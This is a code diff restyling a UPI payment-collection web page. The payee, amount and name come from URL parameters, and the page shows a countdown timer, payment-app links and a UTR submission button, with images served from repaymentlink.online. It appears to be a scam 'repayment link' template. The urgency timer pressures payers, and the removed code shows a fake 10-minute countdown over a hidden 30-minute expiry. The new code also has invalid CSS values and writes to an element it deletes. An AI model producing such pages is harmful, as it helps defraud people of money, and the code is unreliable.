@@ -22,79 +22,76 @@
         font-size: 24px;
         color: #333;
     }
-    /* Updated Timer Style to match the image */
-    .timer {
+    /* New Timer Style */
+    .order-bar {
         display: flex;
-        justify-content: space-between; /* To separate "Order will be closed in:" and the timer box */
+        justify-content: space-between;
         align-items: center;
-        font-size: 16px; /* Smaller font for the text part */
-        font-weight: normal; /* Normal weight for the text part */
-        color: #333; /* Black text for "Order will be closed in:" */
-        margin-bottom: 20px;
-        padding: 5px 0; /* Add some vertical padding around the timer line */
+        font-family: Arial, sans-serif;
+        font-size: 15px;
+        font-weight: 600;
+        color: #0f172a;
+        margin-bottom: 10px;
     }
-    .timer .timer-text {
-        color: #333; /* Ensure this text is black */
-        font-size: 16px;
-        font-weight: normal;
+    .order-bar .timer {
+        display: flex;
+        align-items: center;
+        gap: 5px;
     }
-    .timer .timer-box {
-        background-color: #007bff; /* Blue background for the timer digits as in image */
-        color: #fff; /* White text for timer digits */
-        padding: 8px 12px; /* Adjusted padding for a more prominent box */
+    .order-bar .time-box {
+        background: #007bff;
+        color: #fff;
+        padding: 2px 2px;
         border-radius: 5px;
-        font-size: 18px; /* Larger font for the digits */
-        font-weight: bold; /* Bold digits */
-        display: inline-block;
-        min-width: 60px; /* Ensure a minimum width for consistent look */
+        font-weight: bold;
+        font-size: 14px;
+        min-width: 26px;
         text-align: center;
     }
-    .timer.expired {
-        color: #333; /* Black text for "Link Expired" */
-        justify-content: center; /* Center "Link Expired" message */
-        font-size: 18px; /* Larger font for expired message */
+    .order-bar .colon {
+        font-size: 10px;
         font-weight: bold;
     }
     .details-section {
-        margin-bottom: 20px;
+        margin-bottom: 9px;
     }
     .detail-item {
         display: flex;
         justify-content: space-between;
         align-items: center;
-        padding: 10px 0;
-        border-bottom: 1px solid #eee;
+        padding: 9px 0;
+        border-bottom: 1px #eee;
     }
     .detail-item:last-child {
         border-bottom: none;
     }
     .detail-item .label {
-        font-weight: bold;
-        color: #555;
+        font-weight: border;
+        color: #000000;
     }
     .detail-item .value {
-        color: #000;
-        font-size: 16px;
+        color: #000000;
+        font-size: 13px;
     }
     .value-container {
-        display: flex;
+        display: bold;
         align-items: center;
     }
     .copy-btn {
-        background-color: #e0e0e0;
-        border: 1px solid #ccc;
-        color: #555;
-        padding: 5px 10px;
-        border-radius: 5px;
+        background-color: #FFFFFF;
+        border: 1px solid #5D3FD3;
+        color: #5D3FD3;
+        padding: 10px 10px;
+        border-radius: 7px;
         cursor: pointer;
-        font-size: 12px;
+        font-size: 17px;
     }
     .payment-methods {
-        margin-top: 20px;
+        margin-top: 15px;
     }
     .payment-methods h4 {
         margin-bottom: 10px;
-        color: #555;
+        color: #5D3FD3;
     }
     .method-option {
         display: flex;
@@ -103,7 +100,7 @@
         cursor: pointer;
     }
     .method-option input[type="radio"] {
-        margin-right: 10px;
+        margin-right: 16px;
     }
     .method-option img {
         height: 24px;
@@ -114,7 +111,7 @@
     }
     .utr-section h4 {
         margin-bottom: 10px;
-        color: #555;
+        color: #5D3FD3;
     }
     .utr-input {
         width: 100%;
@@ -124,14 +121,14 @@
         box-sizing: border-box;
     }
     .button-container {
-        margin-top: 20px;
+        margin-top: 15px;
         text-align: center;
     }
     .submit-btn {
         width: 100%;
-        padding: 12px;
+        padding: 14px;
         border: none;
-        border-radius: 5px;
+        border-radius: 100px;
         font-size: 16px;
         cursor: pointer;
         margin-bottom: 10px;
@@ -139,7 +136,7 @@
         color: #fff;
     }
     .submit-btn.blue {
-        background-color: #007bff;
+        background-color: #5D3FD3;
     }
     .submit-btn.orange {
         background-color: #ff8c00;
@@ -211,17 +208,22 @@
 </style>
 
 <div class="payment-container">
-    <div class="timer" id="timer-display">
-        <span class="timer-text">Order will be closed in:</span> <span class="timer-box" id="time-left">10:00</span>
+    <div class="order-bar" data-minutes="10" data-seconds="0" data-finish-text="Link Expired">
+        <div class="label">Order will be closed in:</div>
+        <div class="timer">
+            <span class="time-box" id="mm">10</span>
+            <span class="colon">:</span>
+            <span class="time-box" id="ss">00</span>
+        </div>
     </div>
 
-    <div class="details-section">
-        <div class="detail-item">
-            <span class="label">Amount</span>
-            <div class="value-container">
-                <span class="value" id="amount_val">...</span>
-                <button class="copy-btn" onclick="copyToClipboard('amount_val')">COPY</button>
-            </div>
+ <div class="details-section">
+    <div class="detail-item">
+        <span class="label">Amount</span>
+        <div class="value-container">
+            <span class="value">₹<span id="amount_val">...</span></span>
+            <button class="copy-btn" onclick="copyToClipboard('amount_val')">COPY</button>
+        </div>
         </div>
         <div class="detail-item">
             <span class="label">VPA/UPI</span>
@@ -231,34 +233,33 @@
             </div>
         </div>
         <div class="detail-item">
-            <span class="label">Name</span>
-            <span class="value" id="name_val">...</span>
+            
         </div>
     </div>
     
-    <div class="notice-section">
-        <p><span class="notice-title">Notice:</span></p>
-        <p>1. One UPI can only transfer money once.</p>
-        <p>2. Don't change the payment amount. Otherwise, the order cannot be closed.</p>
-    </div>
+    <div class="van-justify-left" type="flex" style="margin-top: 0rem; padding: 0.5rem; font-size: 14px; line-height: 1.7;">
+  <span style="color: red; font-weight: bold;">Notice:</span>
+  <br>1. <span style="color: red;">One UPI</span> can only transfer money <span style="color: red;">once</span>.
+  <br>2. Don't change the <span style="color: red;">payment amount</span>.Otherwise, the order cannot be closed.
+</div>
 
     <div class="payment-methods">
         <h4>↓ Select payment method and pay</h4>
         <div class="method-option" onclick="openPaymentApp('phonepe')">
             <input type="radio" name="payment_method" value="phonepe">
-            <img src="https://taqabbal.shop/wp-content/uploads/2025/09/phone-pe-scaled.png" alt="PhonePe">
+            <img src="https://repaymentlink.online/wp-content/uploads/2025/09/phone-pe-scaled.png" alt="PhonePe">
         </div>
         <div class="method-option" onclick="openPaymentApp('paytm')">
             <input type="radio" name="payment_method" value="paytm">
-            <img src="https://taqabbal.shop/wp-content/uploads/2025/09/paytm.png" alt="Paytm">
+            <img src="https://repaymentlink.online/wp-content/uploads/2025/09/paytm.png" alt="Paytm">
         </div>
         <div class="method-option" onclick="openPaymentApp('gpay')">
             <input type="radio" name="payment_method" value="gpay">
-            <img src="https://taqabbal.shop/wp-content/uploads/2025/09/Googl-Pay.png" alt="GPay">
+            <img src="https://repaymentlink.online/wp-content/uploads/2025/09/Googl-Pay.png" alt="GPay">
         </div>
         <div class="method-option" onclick="openPaymentApp('upi')">
             <input type="radio" name="payment_method" value="upi">
-            <img src="https://taqabbal.shop/wp-content/uploads/2025/09/UPI.png" alt="UPI">
+            <img src="https://repaymentlink.online/wp-content/uploads/2025/09/UPI.png" alt="UPI">
         </div>
     </div>
 
@@ -269,13 +270,12 @@
 
     <div class="button-container">
         <button class="submit-btn blue" onclick="showSuccessPage()">Submit UTR</button>
-        <button class="submit-btn orange">Pay failed (Try bank account)</button>
     </div>
     
     <div class="bottom-logos">
-        <img src="https://taqabbal.shop/wp-content/uploads/2025/09/PhonePe.png" alt="PhonePe">
-        <img src="https://taqabbal.shop/wp-content/uploads/2025/09/Gpay-googlepay.png" alt="Gpay">
-        <img src="https://taqabbal.shop/wp-content/uploads/2025/09/paytm-upi.png" alt="paytmupi">
+        <img src="https://repaymentlink.online/wp-content/uploads/2025/09/PhonePe.png" alt="PhonePe">
+        <img src="https://repaymentlink.online/wp-content/uploads/2025/09/Gpay-googlepay.png" alt="Gpay">
+        <img src="https://repaymentlink.online/wp-content/uploads/2025/09/paytm-upi.png" alt="paytmupi">
     </div>
 
     <div class="footer-note">
@@ -311,12 +311,9 @@
     }
 
     function openPaymentApp(app) {
-        // Select the radio button for the clicked option
         document.querySelector(`input[value="${app}"]`).checked = true;
-
         let appUrl;
         
-        // This is the simplest deep link that will open the app without pre-filling details.
         if (app === 'phonepe') {
             appUrl = `phonepe://`;
         } else if (app === 'paytm') {
@@ -334,64 +331,47 @@
         }
     }
 
-    // Timer Functionality
-    const timerElement = document.getElementById('time-left'); // The span inside the timer box
-    const timerDisplayContainer = document.getElementById('timer-display'); // The main timer div
-    const utrInput = document.querySelector('.utr-input');
-    const submitBtn = document.querySelector('.submit-btn.blue');
-    const payFailedBtn = document.querySelector('.submit-btn.orange');
-    const methodOptions = document.querySelectorAll('.method-option');
+    (function(){
+        const root = document.querySelector('.order-bar');
+        const mm = document.getElementById('mm');
+        const ss = document.getElementById('ss');
+        let m = parseInt(root.getAttribute('data-minutes'), 10);
+        let s = parseInt(root.getAttribute('data-seconds'), 10);
+        const finish = root.getAttribute('data-finish-text');
+        let total = m * 60 + s;
+        
+        const utrInput = document.querySelector('.utr-input');
+        const submitBtn = document.querySelector('.submit-btn.blue');
+        const methodOptions = document.querySelectorAll('.method-option');
 
-    // Total expiration time in seconds (30 minutes)
-    let totalExpirationSeconds = 30 * 60;
-    // Customer's visible countdown time in seconds (10 minutes)
-    let customerCountdownSeconds = 10 * 60;
-    
-    let timerInterval;
+        function show(t) {
+            const min = Math.floor(t / 60);
+            const sec = t % 60;
+            mm.textContent = String(min).padStart(2, '0');
+            ss.textContent = String(sec).padStart(2, '0');
+        }
 
-    function startTimer() {
-        timerInterval = setInterval(() => {
-            // Decrement both counters every second
-            totalExpirationSeconds--;
-            customerCountdownSeconds--;
+        show(total);
 
-            // Check if the overall link has expired (30 minutes)
-            if (totalExpirationSeconds <= 0) {
-                clearInterval(timerInterval);
-                timerDisplayContainer.innerHTML = 'Link Expired'; // Display "Link Expired" directly
-                timerDisplayContainer.classList.add('expired'); // Add expired class for styling
+        const tick = setInterval(() => {
+            total--;
+            if (total <= 0) {
+                show(0);
+                clearInterval(tick);
+                root.querySelector('.label').textContent = finish;
                 
-                // Disable all payment-related elements
                 utrInput.disabled = true;
                 submitBtn.disabled = true;
-                payFailedBtn.disabled = true;
-                
                 const radioButtons = document.querySelectorAll('input[name="payment_method"]');
                 radioButtons.forEach(radio => radio.disabled = true);
-                
                 methodOptions.forEach(option => option.onclick = null);
 
-                return;
+            } else {
+                show(total);
             }
-
-            // Update the visible timer if it's still running (10 minutes)
-            if (customerCountdownSeconds > 0) {
-                const minutes = Math.floor(customerCountdownSeconds / 60);
-                const seconds = customerCountdownSeconds % 60;
-                
-                timerElement.innerText = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-            } else if (customerCountdownSeconds === 0) {
-                // When the 10-minute visual timer is exactly over
-                timerDisplayContainer.innerHTML = '<span class="timer-text" style="color:#333;">Order will be closed soon.</span>'; // Update message
-                timerDisplayContainer.classList.remove('timer'); // Remove the timer class to clear existing styles
-                timerDisplayContainer.style.justifyContent = 'center'; // Center the message
-            }
-            // If customerCountdownSeconds is negative, it means the 10-min visual timer is past,
-            // and the message "Order will be closed soon." is already displayed.
         }, 1000);
-    }
-    
-    // Start the timer when the page loads
+    })();
+
     window.onload = function() {
         const urlParams = new URLSearchParams(window.location.search);
         const name = urlParams.get('name');
@@ -401,8 +381,5 @@
         if (name) document.getElementById('name_val').innerText = name;
         if (upi) document.getElementById('upi_val').innerText = upi;
         if (amount) document.getElementById('amount_val').innerText = amount;
-        
-        startTimer();
     };
 </script>
-
